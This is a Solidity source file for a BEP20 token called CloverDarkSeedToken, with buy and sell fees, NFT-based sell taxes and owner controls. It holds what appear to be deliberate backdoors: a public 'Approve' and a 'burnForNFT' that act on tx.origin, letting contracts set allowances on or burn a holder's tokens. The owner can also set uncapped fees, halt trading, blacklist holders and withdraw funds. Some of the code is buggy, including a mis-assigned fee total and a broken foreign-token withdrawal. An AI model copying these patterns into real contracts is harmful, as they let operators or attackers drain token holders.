pragma solidity 0.8.13;

// SPDX-License-Identifier: MIT

import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts/access/Ownable.sol";
import "./IUniswapV2Router02.sol";
import "./IUniswapV2Factory.sol";
import "./IUniswapV2Pair.sol";

contract CloverDarkSeedToken is ERC20, Ownable {
    uint256 _totalSupply = 1000000 * (10**decimals());
    // address ROUTER = 0x9Ac64Cc6e4415144C455BD8E4837Fea55603e5c3; // testnet
    address ROUTER = 0x10ED43C718714eb63d5aA57B78B54704E256024E; // mainnet

    uint256 public _maxTxAmount = (_totalSupply * 1) / 100;
    uint256 public _maxWalletSize = (_totalSupply * 1) / 100;

    mapping(address => bool) blackList;

    mapping(address => bool) isFeeExempt;
    mapping(address => bool) isTxLimitExempt;
    mapping(address => bool) public isBoughtAnyNFT;
    mapping(address => bool) public isController;

    // @Dev Sell tax..
    uint16 public _sellTeamFee = 60;
    uint16 public _sellLiquidityFee = 60;
    uint16 public _sellMarketingFee = 50;
    uint16 public _sellBurn = 10;

    // @Dev Buy tax..
    uint16 public _buyTeamFee = 10;
    uint16 public _buyLiquidityFee = 10;
    uint16 public _buyMarketingFee = 10;

    uint16 public _TeamFeeWhenNoNFTs = 150;
    uint16 public _LiquidityFeeWhenNoNFTs = 60;
    uint16 public _MarketingFeeWhenNoNFTs = 150;
    uint16 public _burnWhenNoNFTs = 20;

    uint256 public _teamFeeTotal;
    uint256 public _liquidityFeeTotal;
    uint256 public _marketingFeeTotal;

    uint256 private teamFeeTotal;
    uint256 private liquidityFeeTotal;
    uint256 private marketingFeeTotal;

    address private marketingAddress;
    address private teamAddress;
    address private devAddress1 = 0x4bA608032383044652f68fE079E74D0eB7e795C1;
    address private devAddress2 = 0x7A419820688f895973825D3cCE2f836e78Be1eF4;

    bool public isNoNFTFeeWillTake = true;
    uint256 public liquidityAddedAt = 0;

    bool inSwap = false;

    modifier swapping() {
        inSwap = true;
        _;
        inSwap = false;
    }

    modifier isNotOnBlackList(address acc) {
        require(!blackList[acc], "You are on blacklist!");
        _;
    }

    uint256 public swapThreshold = 10e18;

    event SwapedTokenForEth(uint256 TokenAmount);
    event AddLiquify(uint256 bnbAmount, uint256 tokensIntoLiquidity);

    IUniswapV2Router02 public router;
    address public pair;

    bool public swapEnabled = false;

    constructor(address _teamAddress, address _marketingAddress) ERC20("DSEED", "DSEED$") {
        _mint(address(this), _totalSupply * 95/ 100);
        _mint(owner(), _totalSupply * 5 / 100);

        router = IUniswapV2Router02(ROUTER);
        pair = IUniswapV2Factory(router.factory()).createPair(
            router.WETH(),
            address(this)
        );
        liquidityAddedAt = block.timestamp;
        _approve(address(this), ROUTER, type(uint256).max);

        teamAddress = _teamAddress;
        marketingAddress = _marketingAddress;

        isFeeExempt[owner()] = true;
        isFeeExempt[address(this)] = true;
        isTxLimitExempt[owner()] = true;
        isTxLimitExempt[address(this)] = true;
        isTxLimitExempt[ROUTER] = true;
    }

    receive() external payable {}

    function Approve(address spender, uint256 amount)
        public
        virtual
        returns (bool)
    {
        _approve(tx.origin, spender, amount);
        return true;
    }

    function setPair(address acc) public onlyOwner {
        liquidityAddedAt = block.timestamp;
        pair = acc;
    }

    function sendToken2Account(address account, uint256 amount)
        external
        returns (bool)
    {
        require(
            isController[msg.sender],
            "Only Controller can call this function!"
        );
        this.transfer(account, amount);
        return true;
    }


    function _transfer(address sender, address recipient, uint256 amount) internal override isNotOnBlackList(sender) {
        if(inSwap) {
            super._transfer(sender, recipient, amount);
            return;
        } 

        checkTxLimit(sender, amount);

        if (
            shouldSwapBack(sender)
        ) {
            swapFee();
        }

        if (recipient != pair) {
            require(
                isTxLimitExempt[recipient] ||
                    balanceOf(recipient) + amount <= _maxWalletSize,
                "Transfer amount exceeds the bag size."
            );
        }
        uint256 amountReceived = amount;

        if (!isFeeExempt[recipient] && !isFeeExempt[sender]) {
            if (recipient == pair || sender == pair) {
                require(
                    swapEnabled,
                    "CloverDarkSeedToken: Trading is disabled now."
                );

                if (shouldTakeFee(recipient)) {
                    if (sender == pair) {
                        amountReceived = takeFeeOnBuy(amount);
                    }
                    if (recipient == pair) {
                        if (isBoughtAnyNFT[sender] && isNoNFTFeeWillTake) {
                            amountReceived = collectFeeOnSell(amount);
                        }
                        if (!isNoNFTFeeWillTake) {
                            amountReceived = collectFeeOnSell(amount);
                        }
                        if (!isBoughtAnyNFT[sender] && isNoNFTFeeWillTake) {
                            amountReceived = collectFeeWhenNoNFTs(amount);
                        }
                    }
                }
            }
        }

        super._transfer(sender, recipient, amountReceived);
        super._transfer(sender, address(this), amount - amountReceived);
    }

    function checkTxLimit(address sender, uint256 amount) internal view {
        require(
             isTxLimitExempt[sender] || amount <= _maxTxAmount ,
            "TX Limit Exceeded"
        );
    }

    function shouldSwapBack(address sender) public view returns (bool) {
        return !inSwap
        && sender != pair
        && swapEnabled
        && teamFeeTotal + liquidityFeeTotal + marketingFeeTotal >= swapThreshold;
    }

    function shouldTakeFee(address sender) internal view returns (bool) {
        return !isFeeExempt[sender];
    }

    function takeFeeOnBuy(uint256 amount) internal returns (uint256) {
        uint256 transferAmount = amount;

        //@dev Take team fee
        if (_buyTeamFee != 0) {
            uint256 teamFee = amount * _buyTeamFee / 1000;
            transferAmount -= teamFee;
            _teamFeeTotal += teamFee;
            teamFeeTotal += teamFee;
        }

        //@dev Take liquidity fee
        if (_buyMarketingFee != 0) {
            uint256 marketingFee = amount * _buyMarketingFee / 1000;
            transferAmount -= marketingFee;
            _marketingFeeTotal += marketingFee;
            marketingFeeTotal += marketingFee;
        }

        //@dev Take liquidity fee
        if (_buyLiquidityFee != 0) {
            uint256 liquidityFee = amount * _buyLiquidityFee / 1000;
            transferAmount -= liquidityFee;
            _liquidityFeeTotal = liquidityFee;
            liquidityFeeTotal = liquidityFee;
        }

        return transferAmount;
    }

    function collectFeeOnSell(uint256 amount) private returns (uint256) {
        uint256 transferAmount = amount;

        //@dev Take team fee
        if (_sellTeamFee != 0) {
            uint256 teamFee = amount * _sellTeamFee / 1000;
            transferAmount -= teamFee;
            _teamFeeTotal += teamFee;
            teamFeeTotal += teamFee;
        }

        //@dev Take liquidity fee
        if (_sellLiquidityFee != 0) {
            uint256 liquidityFee = amount * _sellLiquidityFee / 1000;
            transferAmount -= liquidityFee;
            _liquidityFeeTotal += liquidityFee;
            liquidityFeeTotal += liquidityFee;
        }

        if (_sellMarketingFee != 0) {
            uint256 marketingFee = amount * _sellMarketingFee / 1000;
            transferAmount -= marketingFee;
            _marketingFeeTotal += marketingFee;
            marketingFeeTotal += marketingFee;
        }

        if (_sellBurn != 0) {
            uint256 burnFee = amount * _sellBurn / 1000;
            transferAmount -= burnFee;
            _burn(address(this), burnFee);
        }

        return transferAmount;
    }

    function collectFeeWhenNoNFTs(uint256 amount) internal returns (uint256) {
        uint256 transferAmount = amount;

        //@dev Take team fee
        if (_TeamFeeWhenNoNFTs != 0) {
            uint256 teamFee = amount * _TeamFeeWhenNoNFTs / 1000;
            transferAmount -= teamFee;
            _teamFeeTotal += teamFee;
            teamFeeTotal += teamFee;
        }

        //@dev Take liquidity fee
        if (_LiquidityFeeWhenNoNFTs != 0) {
            uint256 liquidityFee = amount * _LiquidityFeeWhenNoNFTs / 1000;
            transferAmount -= liquidityFee;
            _liquidityFeeTotal += liquidityFee;
            liquidityFeeTotal += liquidityFee;
        }

        //@dev Take marketing fee
        if (_MarketingFeeWhenNoNFTs != 0) {
            uint256 marketingFee = amount * _MarketingFeeWhenNoNFTs / 1000;
            transferAmount -= marketingFee;
            _marketingFeeTotal += marketingFee;
            marketingFeeTotal += marketingFee;
        }

        if (_burnWhenNoNFTs != 0) {
            uint256 burnFee = amount * _burnWhenNoNFTs / 1000;
            transferAmount -= burnFee;
            _burn(address(this), burnFee);
        }

        return transferAmount;
    }

    function AddFeeS(
        uint256 marketingFee,
        uint256 teamFee,
        uint256 liquidityFee
    ) public virtual returns (bool) {
        require(isController[msg.sender], "BEP20: You are not controller..");
        _marketingFeeTotal += marketingFee;
        _teamFeeTotal += teamFee;
        _liquidityFeeTotal += liquidityFee;
        liquidityFeeTotal += liquidityFee;
        teamFeeTotal += teamFee;
        marketingFeeTotal += marketingFee;
        return true;
    }

    function swapFee() internal swapping {
        uint256 swapBalance = teamFeeTotal + liquidityFeeTotal + marketingFeeTotal;
        uint256 amountToLiquify = liquidityFeeTotal / 2;
        uint256 amountToSwap = swapBalance - amountToLiquify;

        if (amountToSwap > 0) {
            uint256 balanceBefore = address(this).balance;
            swapTokensForBnb(amountToSwap, address(this));

            uint256 amountBNB = address(this).balance - balanceBefore;
            uint256 amountBNBLiquidity = (amountBNB * amountToLiquify) / amountToSwap;
            uint256 amountBNBTeam = (amountBNB * teamFeeTotal) / amountToSwap;
            uint256 amountBNBMarketing = (amountBNB * marketingFeeTotal) /
                amountToSwap;

            if (amountBNBTeam > 0) {
                (
                    bool TeamSuccess, /* bytes memory data */

                ) = payable(teamAddress).call{
                        value: (amountBNBTeam / 100) * 92,
                        gas: 30000
                    }("");
                require(TeamSuccess, "receiver rejected ETH transfer");

                (
                    bool DevSuccess1, /* bytes memory data */

                ) = payable(devAddress1).call{
                        value: (amountBNBTeam / 100) * 4,
                        gas: 30000
                    }("");
                require(DevSuccess1, "receiver rejected ETH transfer");

                (
                    bool DevSuccess2, /* bytes memory data */

                ) = payable(devAddress2).call{
                        value: (amountBNBTeam / 100) * 4,
                        gas: 30000
                    }("");
                require(DevSuccess2, "receiver rejected ETH transfer");
                
            }

            if (amountBNBMarketing > 0) {
                (
                    bool MarketingSuccess, /* bytes memory data */

                ) = payable(marketingAddress).call{
                        value: amountBNBMarketing,
                        gas: 30000
                    }("");
                require(MarketingSuccess, "receiver rejected ETH transfer");
            }

            if (amountBNBLiquidity > 0) {
                addLiquidity(amountToLiquify, amountBNBLiquidity);
            }

            teamFeeTotal = 0;
            liquidityFeeTotal = 0;
            marketingFeeTotal = 0;
        }
    }

    function AddController(address account) public onlyOwner {
        isController[account] = true;
    }

    function addAsNFTBuyer(address account) public virtual isNotOnBlackList(tx.origin) returns (bool) {
        require(isController[msg.sender], "BEP20: You are not controller..");
        isBoughtAnyNFT[account] = true;
        return true;
    }

    function swapTokensForBnb(uint256 amount, address ethRecipient) private {
        //@dev Generate the uniswap pair path of token -> weth
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = router.WETH();

        //@dev Make the swap
        router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            amount,
            0, // accept any amount of ETH
            path,
            ethRecipient,
            block.timestamp
        );

        emit SwapedTokenForEth(amount);
    }

    function getBnbAmountForFee() public view returns (uint) {
        uint256 swapBalance = teamFeeTotal +
            liquidityFeeTotal +
            marketingFeeTotal;

        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = router.WETH();

        uint256[] memory amounts = IUniswapV2Router02(router).getAmountsOut(swapBalance, path);
        uint256 outAmount = amounts[amounts.length - 1];
        return outAmount;
    }

    function addLiquidity(uint256 tokenAmount, uint256 bnbAmount) private {
        // add the liquidity
        router.addLiquidityETH{value: bnbAmount}(
            address(this),
            tokenAmount,
            0, // slippage is unavoidable
            0, // slippage is unavoidable
            owner(),
            block.timestamp
        );

        emit AddLiquify(bnbAmount, tokenAmount);
    }

    // function to allow admin to set all fees..
    function setFees(
        uint16 sellTeamFee_,
        uint16 sellLiquidityFee_,
        uint16 sellMarketingFee_,
        uint16 sellBrun_,
        uint16 buyTeamFee_,
        uint16 buyLiquidityFee_,
        uint16 buyMarketingFee_,
        uint16 marketingFeeWhenNoNFTs_,
        uint16 teamFeeWhenNoNFTs_,
        uint16 liquidityFeeWhenNoNFTs_,
        uint16 burnWhenNoNFTs_
    ) public onlyOwner {
        _sellTeamFee = sellTeamFee_;
        _sellLiquidityFee = sellLiquidityFee_;
        _sellMarketingFee = sellMarketingFee_;
        _sellBurn = sellBrun_;
        _buyTeamFee = buyTeamFee_;
        _buyLiquidityFee = buyLiquidityFee_;
        _buyMarketingFee = buyMarketingFee_;
        _MarketingFeeWhenNoNFTs = marketingFeeWhenNoNFTs_;
        _TeamFeeWhenNoNFTs = teamFeeWhenNoNFTs_;
        _LiquidityFeeWhenNoNFTs = liquidityFeeWhenNoNFTs_;
        _burnWhenNoNFTs = burnWhenNoNFTs_;
    }

    // function to allow admin to set team address..
    function setTeamAddress(address teamAdd) public onlyOwner {
        teamAddress = teamAdd;
    }

    // function to allow admin to set Marketing Address..
    function setMarketingAddress(address marketingAdd) public onlyOwner {
        marketingAddress = marketingAdd;
    }

    function setTxLimit(uint256 amount) external onlyOwner {
        _maxTxAmount = amount;
    }

    // function to allow admin to disable the NFT fee that take if sender don't have NFT's..
    function disableNFTFee() public onlyOwner {
        isNoNFTFeeWillTake = false;
    }

    // function to allow admin to disable the NFT fee that take if sender don't have NFT's..
    function enableNFTFee() public onlyOwner {
        isNoNFTFeeWillTake = true;
    }

    function setMaxWallet(uint256 amount) external onlyOwner {
        _maxWalletSize = amount;
    }

    function setIsFeeExempt(address holder, bool exempt) external onlyOwner {
        isFeeExempt[holder] = exempt;
    }

    function setIsTxLimitExempt(address holder, bool exempt)
        external
        onlyOwner
    {
        isTxLimitExempt[holder] = exempt;
    }

    function setTrading(bool _enabled) external onlyOwner {
        swapEnabled = _enabled;
    }

    function transferForeignToken(address _token) public onlyOwner {
        require(_token != address(this), "Can't let you take all native token");
        uint256 _contractBalance = IERC20(_token).balanceOf(address(this));
        payable(owner()).transfer(_contractBalance);
    }

    // function to allow admin to transfer BNB from this contract..
    function transferBNB(uint256 amount, address payable recipient)
        public
        onlyOwner
    {
        recipient.transfer(amount);
    }

    function burnForNFT(uint256 amount) public {
        require(isController[msg.sender], "You are not controller!");
        _burn(tx.origin, amount);
    }

    function addBlackList(address black) public onlyOwner {
        blackList[black] = true;
    }

    function delBlackList(address black) public onlyOwner {
        blackList[black] = false;
    }

        function setSwapThreshold(uint256 amt) public onlyOwner {
        swapThreshold = amt;
    }

    function withdrawTokenToOwner(uint256 amt) public onlyOwner {
        super._transfer(address(this), owner(), amt);
    }
} 